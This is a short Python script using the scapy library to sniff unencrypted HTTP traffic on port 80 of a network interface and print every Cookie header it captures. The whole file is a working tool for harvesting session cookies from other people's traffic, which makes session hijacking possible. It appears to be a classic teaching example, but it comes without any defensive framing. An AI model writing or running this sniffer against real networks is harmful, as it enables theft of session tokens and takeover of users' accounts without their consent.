#!/usr/bin/python

import re
from scapy.all import sniff

dev = "enp0s3"


def handle_packet(packet):
    tcp = packet.getlayer("TCP")
    match = re.search(r"Cookie: (.+)", str(tcp.payload))
    if match:
        print match.group(1)


sniff(
    iface=dev,
    store=0,
    filter="tcp and port 80",
    prn=handle_packet
)
